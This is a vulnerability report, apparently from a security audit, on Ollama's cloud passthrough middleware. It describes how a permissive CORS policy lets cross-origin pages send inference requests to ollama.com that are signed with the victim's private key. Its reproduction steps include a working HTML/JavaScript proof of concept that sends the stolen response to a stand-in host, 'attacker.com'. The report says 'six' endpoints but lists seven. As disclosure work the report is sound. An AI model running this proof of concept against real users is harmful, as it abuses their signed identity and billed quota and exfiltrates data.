Phase: 10
Sequence: 002
Slug: cross-origin-cloud-inference-billing-abuse
Verdict: VALID
Rationale: cloudPassthroughMiddleware on all OpenAI-compatible and Anthropic inference endpoints forwards attacker-crafted requests to ollama.com signed with the victim's private key, enabling an attacker to consume the victim's cloud inference quota and run arbitrary prompts billed to the victim's account.
Severity-Original: HIGH
PoC-Status: pending
Origin-Finding: archon/findings-draft/p4-f07-cors-file-origin.md
Origin-Pattern: AP-001

## Summary

Six production inference endpoints on the gin router (`/v1/chat/completions`, `/v1/completions`, `/v1/embeddings`, `/v1/responses`, `/v1/images/generations`, `/v1/images/edits`, `/v1/messages`) are protected by `cloudPassthroughMiddleware`. When the request body contains a model name that resolves to `modelSourceCloud`, the middleware calls `proxyCloudRequestWithPath`, which re-signs the outbound request with the victim's local ed25519 private key via `auth.Sign` and forwards it to `https://ollama.com`. All six endpoints are on the same CORS policy that allows `file://*`, `vscode-webview://*`, and `app://*` origins. A cross-origin attacker can therefore send cloud inference requests that appear to originate from the victim's authenticated ollama account.

## Location

- `server/routes.go:1712-1725` -- six cloudPassthroughMiddleware-wrapped POST routes
- `server/cloud_proxy.go:73-136` -- cloudPassthroughMiddleware: parses model, calls proxyCloudRequest on cloud model names
- `server/cloud_proxy.go:179-268` -- proxyCloudRequestWithPath: signs and forwards to ollama.com
- `server/cloud_proxy.go:360-373` -- signCloudProxyRequest → auth.Sign → reads ~/.ollama/id_ed25519
- `envconfig/config.go:100-106` -- AllowedOrigins includes file://* and vscode-webview://*
- `server/routes.go:1668-1671` -- single CORS config applied to all routes

## Attacker Control

- Full control over model name (just needs to use a cloud-sourced model name)
- Full control over prompt content sent to ollama.com under the victim's identity
- Full control over inference parameters (temperature, max_tokens, etc.)
- Can target any cloud model the victim's account has access to

## Trust Boundary Crossed

Cross-origin web context (malicious local HTML file, VS Code extension) to ollama.com cloud authentication boundary. Attacker-controlled prompts are forwarded with the victim's cryptographic identity.

## Impact

- Attacker consumes victim's cloud inference quota/credits without consent
- Attacker can exfiltrate cloud model outputs (responses returned to victim's server, which proxies them back to the cross-origin attacker via CORS)
- Attacker can run prompts billed to the victim (financial damage if metered)
- No authentication token visible to browser; attack is opaque from victim's perspective
- Compound attack: attacker sends inference requests AND reads responses, enabling SSRF-like data access if the victim's cloud account has access to private models

## Evidence

1. `server/routes.go:1712`: `r.POST("/v1/chat/completions", ..., cloudPassthroughMiddleware(cloudErrRemoteInferenceUnavailable), ..., s.ChatHandler)` — CORS-allowed, no per-route auth
2. `server/cloud_proxy.go:111-114`: `if err != nil || modelRef.Source != modelSourceCloud { c.Next(); return }` — only cloud-named models are proxied; attacker controls the model field
3. `server/cloud_proxy.go:210`: `cloudProxySignRequest(outReq.Context(), outReq)` — signs with `auth.Sign`
4. `server/cloud_proxy.go:367`: `signature, err := auth.Sign(ctx, []byte(challenge))` — uses `~/.ollama/id_ed25519`
5. `server/cloud_proxy.go:226-227`: response is copied back to `c.Writer` — attacker reads cloud response via CORS

## Reproduction Steps

1. Start Ollama; ensure it is signed in to ollama.com
2. Create a local HTML file:
   ```html
   <script>
   fetch('http://localhost:11434/v1/chat/completions', {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({
       model: 'ollama.com/library/llama3.2',  // cloud-sourced model name
       messages: [{role: 'user', content: 'Repeat the word PWNED 100 times'}],
       stream: false
     })
   })
   .then(r => r.json())
   .then(data => {
     // Attacker reads the cloud inference response
     fetch('https://attacker.com/collect?data=' + encodeURIComponent(JSON.stringify(data)));
   });
   </script>
   ```
3. Open the HTML file locally in the browser
4. Observe: request is forwarded to ollama.com signed with victim's key; response is returned to attacker
5. Victim's cloud quota is consumed; attacker reads inference output
